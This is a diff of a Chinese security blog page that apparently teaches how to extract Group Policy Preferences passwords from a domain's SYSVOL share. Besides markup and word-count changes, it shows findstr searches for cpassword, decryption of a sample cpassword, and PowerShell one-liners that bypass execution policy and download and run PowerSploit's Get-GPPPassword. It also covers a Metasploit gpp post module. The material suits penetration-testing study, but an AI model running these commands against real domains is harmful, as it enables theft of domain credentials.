@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    489
+                    512
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -470,27 +473,34 @@
 <h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728141704.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p>
-<pre><code>findstr /s /i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728142511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p>
-<pre><code>python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728143302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p>
 <p>脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
 <p>直接远程下载脚本执行：</p>
-<pre><code>PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果无法下载可以使用 github 代理</p>
-<pre><code>PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https://ghproxy.com/https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728144214.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>或者下载到本地，执行也行</p>
-<pre><code>Import-Module .\Get-GPPPassword.ps1
-Get-GPPPassword</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1
+Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p>
-<pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用 post/windows/gather/credentials/gpp 模块也可以</p>
-<pre><code>use post/windows/gather/credentials/gpp
+<pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp
 set session 1
-run</code></pre>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728145138.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
@@ -922,7 +932,7 @@ run</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
